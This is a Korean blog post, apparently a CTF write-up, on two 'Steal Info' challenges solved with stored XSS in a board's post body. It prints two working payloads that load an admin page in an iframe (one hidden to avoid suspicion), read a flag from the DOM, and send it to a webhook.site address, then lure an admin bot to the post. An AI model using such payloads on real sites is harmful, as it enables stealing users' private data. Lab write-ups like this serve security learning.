---
title: "Stealing DOM data via XSS   (Same-Origin DOM Exfiltration)"
date: 2025-06-23
layout: single
toc: true
toc_label: "Stealing DOM data via XSS"
toc_icon: "book"
toc_sticky: true
tags: [web, xss, hacking]
header:
  teaser: /assets/images/stored-reflected-xss.png
---

# 개요

이 페이지는 Same-Origin 정책을 악용한 DOM 정보 탈취 시나리오를 실습한 기록입니다.

공격자는 게시판 등의 기능을 활용해 악성 HTML 문서를 업로드하고, 피해 사용자가 해당 게시글을 열도록 유도함으로써, 사용자의 인지 없이 자동으로 DOM 내 민감 정보가 유출되도록 구성하였습니다.

---

# CTF 문제 풀이

## Steal Info

![취약점 있는 곳](/assets/screenshots/xss-dom-steal/steal1_post.png)

게시글 작성 기능 중 **내용(body)** 입력란에 XSS 취약점이 존재함을 확인하였다.

![타겟 할 웹사이트](/assets/screenshots/xss-dom-steal/target_html.png)

누구나 접근 가능한 페이지(mypage.html)와 동일한 구조의 관리자 페이지 내부 내 정보 영역에 플래그가 숨겨져 있으나, 직접 접근 시 관리자 권한이 없어 차단되는 구조이다.

확보한 정보를 활용해, 비인가 사용자가 관리자 페이지 내부 정보를 탈취하는 시나리오를 구성하고 공격을 수행할 것 이다.

![플래그가 포함된 DOM 구조](/assets/screenshots/xss-dom-steal/target_card-text.png)

위의 `<p class="card-text">` 태그를 이용해, DOM 기반 정보 추출을 시도할 것 이다.

**다시 게시글 작성 으로 돌아가 다음과 같은 페이로드를 입력하였다:**

```html
<iframe src="http://ctf.segfaulthub.com:4343/scriptPrac/secret.php" id="id"></iframe>

<script>
document.addEventListener("DOMContentLoaded", () => {
const id = document.getElementById("id");
const text = id.contentDocument.getElementsByClassName('card-text')[1].textContent;
new Image().src = "https://webhook.site/741989d6-cb27-411b-aa44-a01355948028?c=" + text;
})
</script>
```

![페이로드](/assets/screenshots/xss-dom-steal/steal1_payload.png)

이후 **악성 게시물의 URL을 복사하여 관리자 봇에게 전달**함으로써, 해당 페이지에 접근하도록 유도했다.

![관리자에게 URL 전송](/assets/screenshots/xss-dom-steal/steal1_access_admin.png)

URL이 정상적으로 전달되었으며, 이후 Webhook 로그를 통해 DOM 정보가 외부로 유출된 것을 확인할 수 있다.

![플래그 획득](/assets/screenshots/xss-dom-steal/steal1_flag.png)

이와 같은 방식으로 **관리자 권한 없이 플래그를 탈취하는 데 성공**하였다.

---

## Steal Info 2

![타겟 할 곳](/assets/screenshots/xss-dom-steal/steal2_burp_suite.png)

위 사진의 `<input id="userInfo">` 요소는 관리자 권한으로 접근할 경우, 해당 필드의 `placeholder` 속성에 플래그가 포함되어 있다.

**이 정보를 토대로 게시글 작성 으로 돌아가 다음과 같은 페이로드를 입력하였다:**

```html
<iframe src="http://ctf.segfaulthub.com:4343/scriptPrac2/mypage.php?user=123" style="display:none" id="id"></iframe>

<script>
document.addEventListener("DOMContentLoaded", () => {
const id = document.getElementById("id");
const text = id.contentDocument.getElementById("userInfo").placeholder;
new Image().src = "https://webhook.site/741989d6-cb27-411b-aa44-a01355948028?c=" + text;
})
</script>
```

![페이로드](/assets/screenshots/xss-dom-steal/steal2_payload.png)

`iframe`에 `style="display:none"` 속성을 설정하여, **외부 페이지의 DOM 접근과 form 전송은 가능하게 유지하면서도 UI 요소가 노출되지 않도록 구성**했다. 

이를 통해 관리자가 공격 페이지에 접근하더라도 화면 상으로는 아무런 변화가 없어 의심을 피할 수 있다.

- 사용자가 직접 게시물 클릭 시:

![게시물 클릭](/assets/screenshots/xss-dom-steal/steal2_access.png)

게시글을 클릭하면, 삽입된 스크립트를 통해 현재 사용자의 `userInfo` 요소에 설정된 **placeholder 값**인 `"Nothing Here..."`가 Webhook으로 전송되는 것을 확인하였다.

이걸 이용하여 **URL을 복사하여 관리자 봇에게 전달**할 것 이다.

![관리자에게 URL 전송](/assets/screenshots/xss-dom-steal/steal2_access_admin.png)

관리자 봇에게 XSS가 삽입된 URL을 전달하여 요청을 유도한 후

> **결과:**

![플래그 획득](/assets/screenshots/xss-dom-steal/steal2_flag.png)

**이렇게 관리자 권한 없이 플래그를 획득하는 데 성공했다.**